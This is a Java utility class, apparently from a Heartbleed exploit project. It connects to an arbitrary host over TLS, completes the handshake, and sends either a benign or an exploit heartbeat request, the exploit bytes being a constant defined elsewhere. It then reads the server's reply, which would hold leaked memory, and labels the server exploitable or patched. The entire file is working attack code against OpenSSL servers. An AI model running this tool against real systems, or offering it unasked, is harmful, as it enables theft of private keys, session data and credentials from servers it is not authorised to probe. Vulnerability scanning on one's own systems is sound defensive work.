package com.vegaasen.exploit.heartbleed.util;

import com.vegaasen.exploit.heartbleed.model.Container;
import com.vegaasen.exploit.heartbleed.model.SslType;
import com.vegaasen.exploit.heartbleed.properties.SslConstants;

import java.io.DataInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.logging.Logger;

/**
 * @author <a href="vegaasen@gmail.com">vegardaasen</a>
 */
public final class HeartBeatUtil {

    private static final Logger LOG = Logger.getLogger(HeartBeatUtil.class.getSimpleName());

    private HeartBeatUtil() {
    }

    /**
     * Sends a safe request without any exploit
     *
     * @param hostName _
     * @return _
     */
    public static Container sendRequest(final String hostName) {
        return sendRequest(hostName, SslConstants.DEFAULT_SSL_PORT, false);
    }

    /**
     * Sends a request to a hostname with potentially exploit
     *
     * @param hostName    _
     * @param withExploit _
     * @return _
     */
    public static Container sendRequest(final String hostName, final boolean withExploit) {
        return sendRequest(hostName, SslConstants.DEFAULT_SSL_PORT, withExploit);
    }

    /**
     * Sends a request to a hostname with a specified port and the potentially exploit activated
     *
     * @param hostName    _
     * @param port        _
     * @param withExploit _
     * @return _
     */
    public static Container sendRequest(
            final String hostName,
            final int port,
            final boolean withExploit) {
        LOG.info(
                String.format(
                        "Sending request: %nhostname: %s%nport: %s%nWith exploit: %s",
                        hostName,
                        port,
                        withExploit
                ));
        try (Socket s = new Socket(hostName, port);
             InputStream in = s.getInputStream();
             DataInputStream din = new DataInputStream(in);
             OutputStream out = s.getOutputStream()) {
            final Container verifiedContainer = verifyServerHello(din, out);
            return sendHeartbeat(
                    din,
                    out,
                    (withExploit) ?
                            SslConstants.SSL_HEARTBEAT :
                            SslConstants.getSslHeartbeatWithoutExploit(verifiedContainer.getVersion()));
        } catch (final IOException e) {
            LOG.severe(e.getMessage());
            throw new IllegalStateException(e);
        }
    }

    private static Container verifyServerHello(final DataInputStream din, final OutputStream outputStream) throws IOException {
        LOG.info("Sending SSL Hello");
        outputStream.write(SslConstants.SSL_HELLO);
        Container container;
        for (; ; ) {
            container = readContainer(din);
            if (container == null || container.getPayload() == null || container.getPayload().length == 0) {
                throw new IllegalArgumentException("Unable to connect");
            }
            if (
                    SslType.SSL_HANDSHAKE.equals(container.getType()) &&
                            container.getPayload()[0] == SslConstants.SSL_HELLO_DONE
                    ) {
                LOG.info("SSL Handshake Hello detected. Server is prepared for heartbeat. Returning.");
                break;
            }
        }
        return container;
    }

    private static Container sendHeartbeat(
            final DataInputStream din,
            final OutputStream outputStream,
            byte[] requestPackage) throws IOException {
        LOG.info("Transmitting SSL heartbeat request");
        outputStream.write(requestPackage);
        final Container pkt = readContainer(din);
        LOG.info(String.format("Type %s, Ver %s, Len %s", pkt.getType(), pkt.getVersion(), pkt.getLength()));
        switch (pkt.getType()) {
            case SSL_HEARTBEAT:
                LOG.warning("Server seems to be valid for exploits and should be patched.");
                return pkt.markAsExploitable();
            case SSL_ALERT:
                LOG.info("Server seems to be updated and protected.");
                return pkt.markAsNotExploitable();
            default:
                LOG.warning("Heartbeat not received");
                throw new IllegalStateException("No heartbeat detected/received. Unable to perform request");
        }
    }

    private static Container readContainer(DataInputStream sslInputStream) throws IOException {
        final Container pkt = readHeader(sslInputStream);
        final byte[] payload = new byte[pkt.getLength()];

        sslInputStream.readFully(payload);
        pkt.setPayload(payload);

        return pkt;
    }

    private static Container readHeader(DataInputStream sslInputStream) throws IOException {
        final byte headers[] = new byte[5];
        sslInputStream.readFully(headers);

        final ByteBuffer b = ByteBuffer.wrap(headers);
        final SslType type = SslType.getFromId(b.get());
        int ver = b.getShort();
        int len = b.getShort();

        return new Container(type, ver, len);
    }

}
